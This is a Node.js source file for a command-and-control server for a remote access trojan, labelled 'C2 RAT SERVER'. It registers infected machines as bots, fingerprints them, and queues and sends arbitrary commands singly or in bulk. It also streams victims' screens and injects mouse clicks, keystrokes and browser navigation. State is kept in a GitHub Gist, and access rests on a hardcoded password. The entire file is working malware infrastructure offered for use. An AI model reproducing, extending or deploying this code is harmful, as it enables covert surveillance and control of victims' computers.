const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const crypto = require('crypto');
const { Octokit } = require('@octokit/rest');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static('public'));

// === GITHUB GIST ===
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
const GIST_ID = process.env.GIST_ID || '';
const GIST_FILENAME = 'c2_db.json';

let octokit = null;
let gistEnabled = false;

if (GITHUB_TOKEN && GIST_ID) {
    try {
        octokit = new Octokit({ auth: GITHUB_TOKEN });
        gistEnabled = true;
        console.log('✅ GitHub Gist enabled');
    } catch (e) {
        console.log('❌ GitHub Gist init failed:', e.message);
    }
} else {
    console.log('⚠️ GitHub Gist not configured');
}

// === DATABASE ===
const DB = {
    bots: [],
    commands: [],
    pending_commands: [],
    rat_sessions: [],
    admin_logs: []
};

const streamCache = new Map();

// ============================================================
//  GITHUB GIST FUNCTIONS
// ============================================================
async function loadFromGist() {
    if (!gistEnabled) return false;
    try {
        const response = await octokit.gists.get({ gist_id: GIST_ID });
        const files = response.data.files;
        if (files && files[GIST_FILENAME]) {
            const content = files[GIST_FILENAME].content;
            const data = JSON.parse(content);
            DB.bots = data.bots || [];
            DB.commands = data.commands || [];
            DB.pending_commands = data.pending_commands || [];
            DB.rat_sessions = data.rat_sessions || [];
            DB.admin_logs = data.admin_logs || [];
            console.log('✅ Loaded from Gist');
            return true;
        }
        return false;
    } catch (error) {
        console.log('⚠️ Load Gist failed:', error.message);
        return false;
    }
}

async function saveToGist() {
    if (!gistEnabled) return false;
    try {
        const content = JSON.stringify({
            bots: DB.bots,
            commands: DB.commands,
            pending_commands: DB.pending_commands,
            rat_sessions: DB.rat_sessions,
            admin_logs: DB.admin_logs
        }, null, 2);
        await octokit.gists.update({
            gist_id: GIST_ID,
            files: { [GIST_FILENAME]: { content } }
        });
        console.log('✅ Synced to Gist');
        return true;
    } catch (error) {
        console.log('❌ Sync Gist failed:', error.message);
        return false;
    }
}

async function saveDB() {
    if (gistEnabled) saveToGist().catch(() => {});
}

// === AUTH ===
const ADMIN_PASSWORD = 'H3XTEK0';
const auth = (req, res, next) => {
    const token = req.headers['authorization'];
    if (!token || token !== `Bearer ${ADMIN_PASSWORD}`) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
};

// === WEBSOCKET ===
const botClients = new Map();

wss.on('connection', (ws, req) => {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '0.0.0.0';
    
    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            const botId = data.bot_id;
            if (!botId) return;

            if (data.type === 'register') {
                botClients.set(botId, ws);
                const existing = DB.bots.findIndex(b => b.bot_id === botId);
                const bot = {
                    bot_id: botId,
                    group_name: data.group || 'default',
                    version: data.version || '1.0.0',
                    os: data.os || 'Unknown',
                    hostname: data.hostname || 'Unknown',
                    ip: clientIp,
                    last_seen: Date.now(),
                    online: 1,
                    screen_width: data.screen_width || 1920,
                    screen_height: data.screen_height || 1080
                };
                if (existing !== -1) {
                    DB.bots[existing] = { ...DB.bots[existing], ...bot };
                } else {
                    DB.bots.push(bot);
                }
                await saveDB();

                const pendings = DB.pending_commands.filter(p => p.bot_id === botId);
                pendings.forEach(p => {
                    sendCommand(ws, botId, p.cmd_id, p.command, JSON.parse(p.args || '[]'));
                });
                DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== botId);
                await saveDB();

                console.log(`[BOT] Registered: ${botId}`);
                ws.send(JSON.stringify({ type: 'registered', bot_id: botId }));
            }

            else if (data.type === 'heartbeat') {
                const bot = DB.bots.find(b => b.bot_id === botId);
                if (bot) {
                    bot.last_seen = Date.now();
                    bot.online = 1;
                }
            }

            // === RESULT - FIXED ===
            else if (data.type === 'result') {
                console.log(`[RESULT] ${botId}: ${data.cmd_id} -> ${data.status}`);
                
                // TÌM COMMAND TRONG DB
                let cmdIndex = DB.commands.findIndex(c => c.cmd_id === data.cmd_id);
                
                if (cmdIndex !== -1) {
                    // CẬP NHẬT COMMAND HIỆN CÓ
                    DB.commands[cmdIndex].result = data.result;
                    DB.commands[cmdIndex].status = data.status || 'ok';
                    DB.commands[cmdIndex].executed_at = Date.now();
                    console.log(`[RESULT] ✅ Updated command ${data.cmd_id}`);
                } else {
                    // NẾU KHÔNG TÌM THẤY, TẠO MỚI (FALLBACK)
                    console.log(`[RESULT] ⚠️ Command ${data.cmd_id} not found, creating new`);
                    DB.commands.push({
                        bot_id: botId,
                        cmd_id: data.cmd_id,
                        command: data.command || 'unknown',
                        args: '[]',
                        result: data.result,
                        status: data.status || 'ok',
                        issued_at: Date.now(),
                        executed_at: Date.now()
                    });
                }
                await saveDB();
                
                // GỬI PHẢN HỒI CHO BOT
                ws.send(JSON.stringify({ 
                    type: 'result_ack', 
                    cmd_id: data.cmd_id,
                    status: 'received'
                }));
            }

            else if (data.type === 'rat_stream') {
                streamCache.set(botId, {
                    frame: data.image,
                    timestamp: data.timestamp || Date.now()
                });
                if (streamCache.size > 100) {
                    const keys = streamCache.keys();
                    for (let i = 0; i < 50; i++) {
                        const key = keys.next().value;
                        if (key) streamCache.delete(key);
                    }
                }
            }

        } catch (e) {
            console.error('❌ WS Error:', e);
        }
    });

    ws.on('close', async () => {
        for (let [id, client] of botClients.entries()) {
            if (client === ws) {
                botClients.delete(id);
                const bot = DB.bots.find(b => b.bot_id === id);
                if (bot) {
                    bot.online = 0;
                    await saveDB();
                }
                console.log(`[BOT] Disconnected: ${id}`);
                break;
            }
        }
    });
});

function sendCommand(ws, botId, cmdId, command, args = []) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            type: 'command',
            payload: { cmd_id: cmdId, command, args }
        }));
        console.log(`[CMD] Sent to ${botId}: ${command} (${cmdId})`);
        return true;
    } else {
        console.log(`[CMD] Bot ${botId} not online, queuing`);
        return false;
    }
}

// ============================================================
//  API
// ============================================================

app.get('/api/bots', auth, (req, res) => {
    res.json(DB.bots);
});

app.get('/api/bots/online', auth, (req, res) => {
    res.json(DB.bots.filter(b => b.online === 1));
});

app.delete('/api/bots/:bot_id', auth, async (req, res) => {
    DB.bots = DB.bots.filter(b => b.bot_id !== req.params.bot_id);
    DB.commands = DB.commands.filter(c => c.bot_id !== req.params.bot_id);
    DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== req.params.bot_id);
    await saveDB();
    res.json({ status: 'deleted' });
});

// === GỬI LỆNH - FIXED ===
app.post('/api/command', auth, async (req, res) => {
    const { bot_id, command, args = [] } = req.body;
    if (!bot_id || !command) {
        return res.status(400).json({ error: 'Missing bot_id or command' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    
    // LƯU COMMAND VÀO DB
    DB.commands.push({
        bot_id: bot_id,
        cmd_id: cmdId,
        command: command,
        args: JSON.stringify(args),
        result: null,
        status: 'pending',
        issued_at: Date.now(),
        executed_at: null
    });
    await saveDB();

    // GỬI LỆNH CHO BOT
    const ws = botClients.get(bot_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        sendCommand(ws, bot_id, cmdId, command, args);
        res.json({ status: 'sent', cmd_id: cmdId });
    } else {
        // BOT OFFLINE -> LƯU VÀO PENDING
        DB.pending_commands.push({
            bot_id: bot_id,
            cmd_id: cmdId,
            command: command,
            args: JSON.stringify(args),
            issued_at: Date.now()
        });
        await saveDB();
        res.json({ status: 'queued', cmd_id: cmdId });
    }
});

app.post('/api/command/bulk', auth, async (req, res) => {
    const { bot_ids, command, args = [] } = req.body;
    if (!bot_ids || !Array.isArray(bot_ids) || bot_ids.length === 0) {
        return res.status(400).json({ error: 'Missing bot_ids array' });
    }

    const results = [];
    for (const botId of bot_ids) {
        const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
        DB.commands.push({
            bot_id: botId,
            cmd_id: cmdId,
            command: command,
            args: JSON.stringify(args),
            result: null,
            status: 'pending',
            issued_at: Date.now(),
            executed_at: null
        });
        
        const ws = botClients.get(botId);
        if (ws && ws.readyState === WebSocket.OPEN) {
            sendCommand(ws, botId, cmdId, command, args);
            results.push({ bot_id: botId, status: 'sent', cmd_id: cmdId });
        } else {
            DB.pending_commands.push({
                bot_id: botId,
                cmd_id: cmdId,
                command: command,
                args: JSON.stringify(args),
                issued_at: Date.now()
            });
            results.push({ bot_id: botId, status: 'queued', cmd_id: cmdId });
        }
    }
    await saveDB();
    res.json({ results });
});

// === LẤY KẾT QUẢ - FIXED ===
app.get('/api/results/:cmd_id', auth, (req, res) => {
    const cmdId = req.params.cmd_id;
    console.log(`[API] Looking for result: ${cmdId}`);
    
    // Tìm trong commands
    let cmd = DB.commands.find(c => c.cmd_id === cmdId);
    if (cmd) {
        console.log(`[API] Found result: ${cmd.status}`);
        return res.json(cmd);
    }
    
    // Tìm trong pending commands (fallback)
    const pending = DB.pending_commands.find(p => p.cmd_id === cmdId);
    if (pending) {
        console.log(`[API] Found in pending`);
        return res.json({
            cmd_id: pending.cmd_id,
            result: null,
            status: 'pending',
            issued_at: pending.issued_at
        });
    }
    
    console.log(`[API] Command ${cmdId} not found`);
    res.json({});
});

// === LẤY KẾT QUẢ MỚI NHẤT CHO BOT (RAT) ===
app.get('/api/results/latest/:bot_id', auth, (req, res) => {
    const botId = req.params.bot_id;
    
    const cached = streamCache.get(botId);
    if (cached && cached.frame) {
        return res.json({
            cmd_id: 'stream-latest',
            result: cached.frame,
            status: 'ok',
            executed_at: cached.timestamp
        });
    }
    
    const cmds = DB.commands
        .filter(c => c.bot_id === botId && c.command === 'sc')
        .sort((a, b) => (b.executed_at || 0) - (a.executed_at || 0));
    
    res.json(cmds[0] || {});
});

app.get('/api/history/:bot_id', auth, (req, res) => {
    const history = DB.commands
        .filter(c => c.bot_id === req.params.bot_id)
        .sort((a, b) => b.issued_at - a.issued_at)
        .slice(0, 50);
    res.json(history);
});

app.get('/api/commands', auth, (req, res) => {
    res.json(DB.commands);
});

app.get('/api/pending', auth, (req, res) => {
    res.json(DB.pending_commands);
});

// ============================================================
//  RAT API
// ============================================================

app.post('/api/rat/start', auth, (req, res) => {
    const { bot_id } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    DB.rat_sessions.push({
        bot_id: bot_id,
        socket_id: 'ws-' + Date.now(),
        session_start: Date.now()
    });
    saveDB();

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    sendCommand(ws, bot_id, cmdId, 'rat_start', []);
    res.json({ status: 'rat_started', bot_id });
});

app.post('/api/rat/stop', auth, async (req, res) => {
    const { bot_id } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
        sendCommand(ws, bot_id, cmdId, 'rat_stop', []);
    }
    DB.rat_sessions = DB.rat_sessions.filter(r => r.bot_id !== bot_id);
    streamCache.delete(bot_id);
    await saveDB();
    res.json({ status: 'rat_stopped', bot_id });
});

app.post('/api/rat/event', auth, (req, res) => {
    const { bot_id, event_type, x, y, text, url } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    let command = 'rat_event';
    let args = [event_type];

    if (event_type === 'click' || event_type === 'rightclick' || event_type === 'doubleclick' || event_type === 'move') {
        args.push(x || 0, y || 0);
    } else if (event_type === 'key') {
        args.push(text || '');
    } else if (event_type === 'notepad') {
        command = 'rat_notepad';
        args = [text || ''];
    } else if (event_type === 'browser') {
        command = 'rat_browser';
        args = [url || 'https://www.google.com'];
    }

    sendCommand(ws, bot_id, cmdId, command, args);
    res.json({ status: 'event_sent', cmd_id: cmdId });
});

app.get('/api/rat/stream/:bot_id', auth, (req, res) => {
    const botId = req.params.bot_id;
    const ws = botClients.get(botId);
    
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    sendCommand(ws, botId, cmdId, 'rat_stream', []);
    res.json({ status: 'stream_started', bot_id: botId });
});

// ============================================================
//  DATABASE MANAGEMENT
// ============================================================

app.get('/api/db', auth, (req, res) => {
    res.json(DB);
});

app.get('/api/db/bots', auth, (req, res) => res.json(DB.bots));
app.get('/api/db/commands', auth, (req, res) => res.json(DB.commands));
app.get('/api/db/pending', auth, (req, res) => res.json(DB.pending_commands));

app.delete('/api/db', auth, async (req, res) => {
    DB.bots = [];
    DB.commands = [];
    DB.pending_commands = [];
    DB.rat_sessions = [];
    DB.admin_logs = [];
    streamCache.clear();
    await saveDB();
    res.json({ status: 'cleared' });
});

// ============================================================
//  GIST STATUS API
// ============================================================

app.get('/api/gist/status', auth, (req, res) => {
    res.json({
        enabled: gistEnabled,
        gist_id: GIST_ID || null,
        has_token: !!GITHUB_TOKEN
    });
});

app.post('/api/gist/sync', auth, async (req, res) => {
    if (!gistEnabled) {
        return res.json({ status: 'error', message: 'Gist not configured' });
    }
    const result = await saveToGist();
    res.json({ status: result ? 'ok' : 'error', message: result ? 'Synced' : 'Sync failed' });
});

// ============================================================
//  DASHBOARD
// ============================================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/rat', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'rat.html'));
});

app.get('/style.css', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'style.css'));
});

// ============================================================
//  START
// ============================================================

const PORT = process.env.PORT || 3000;

async function startServer() {
    if (gistEnabled) {
        await loadFromGist();
    }
    
    server.listen(PORT, '0.0.0.0', () => {
        console.log('='.repeat(50));
        console.log('  ✅ C2 RAT SERVER STARTED (FIXED)');
        console.log(`  Port: ${PORT}`);
        console.log(`  Dashboard: http://localhost:${PORT}/`);
        console.log(`  RAT Control: http://localhost:${PORT}/rat`);
        console.log(`  Password: H3XTEK0`);
        console.log(`  Gist: ${gistEnabled ? '✅ Enabled' : '❌ Disabled'}`);
        console.log('='.repeat(50));
    });
}

startServer();
